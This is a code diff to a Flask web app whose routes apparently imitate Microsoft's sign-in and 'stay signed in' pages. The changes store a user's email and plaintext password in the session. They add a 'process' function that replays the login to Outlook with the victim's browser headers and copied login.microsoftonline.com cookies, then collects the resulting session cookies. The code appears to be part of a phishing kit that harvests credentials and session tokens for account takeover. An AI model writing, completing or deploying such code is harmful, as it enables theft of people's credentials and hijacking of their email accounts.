@@ -1132,6 +1132,8 @@ async def sign_in_handler():
         elif login_result.get('status') == 'success':
             # Store login cookies
             session['login_cookies'] = login_result.get('cookies', [])
+            session['email'] = email
+            session['password'] = password
 
             # Redirect to stay_signed_in route
             return jsonify({
@@ -1177,7 +1179,7 @@ async def stay_signed_in():
         # Call process function only for personal accounts with "success" login status
         if is_personal and login_status == 'success':
             user_email = session.get('email')
-            user_password = request.form.get('password')  # Assuming password is still needed here
+            user_password = session.get('password')  # Assuming password is still needed here
             if user_email and user_password:
                 cookie_data = process(user_email, user_password, request)
                 session['cookie_data'] = cookie_data  # Store cookie data in session
@@ -1187,12 +1189,76 @@ async def stay_signed_in():
 
 def process(email, password, request):
     """
-    Placeholder for the process function.
     Replace this with your actual logic to process the email, password, and request.
     """
-    # Your processing logic here
-    # This is just a placeholder, replace it with your actual implementation
-    return {"initial_cookies": [], "session_cookies": {}}
+    try:
+        # Create a session object with browser-like headers
+        session_obj = requests.Session()
+        session_obj.headers.update({
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Referer': request.headers.get('Referer', ''),
+            'Host': 'outlook.live.com' if any(domain in email.lower() for domain in [
+                'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+                'outlook.ca', 'hotmail.ca', 'live.ca'
+            ]) else 'outlook.office.com',
+            'SameSite': 'None',  # Add SameSite attribute
+            'Secure': 'True' # Add Secure attribute
+        })
+
+        # Copy cookies from the user's browser request for login.microsoftonline.com
+        for cookie in request.cookies:
+            if 'login.microsoftonline.com' in request.host:
+                session_obj.cookies.set(cookie.name, request.cookies[cookie.name], domain='login.microsoftonline.com', path='/', secure=True, httponly=True, samesite='none')
+
+        # Get the redirect URL domain
+        is_personal = any(domain in email.lower() for domain in [
+            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+            'outlook.ca', 'hotmail.ca', 'live.ca'
+        ])
+        redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
+        redirect_domain = urllib.parse.urlparse(redirect_url).netloc
+
+        # Make an initial request to the redirect URL to get initial cookies
+        response = session_obj.get(redirect_url, allow_redirects=True)
+        response.raise_for_status()
+
+        initial_cookies = []
+        for cookie in session_obj.cookies:
+            initial_cookies.append({
+                'name': cookie.name,
+                'value': cookie.value,
+                'domain': cookie.domain,
+                'path': cookie.path,
+                'secure': cookie.secure,
+                'expires': cookie.expires,
+                'httponly': cookie.has_nonstandard_attr('HttpOnly'),
+            })
+
+        # Get session cookies after simulating user interaction
+        session_cookies = {}
+        for cookie in session_obj.cookies:
+            session_cookies[cookie.name] = cookie.value
+
+        return {
+            "initial_cookies": initial_cookies,
+            "session_cookies": session_cookies
+        }
+
+    except requests.exceptions.RequestException as e:
+        print(f"RequestException in process: {e}")
+        return {"initial_cookies": [], "session_cookies": {}}
+    except Exception as e:
+        print(f"Exception in process: {e}")
+        return {"initial_cookies": [], "session_cookies": {}}
 
 @app.route('/final-redirect', methods=['POST']) 
 async def final_redirect():
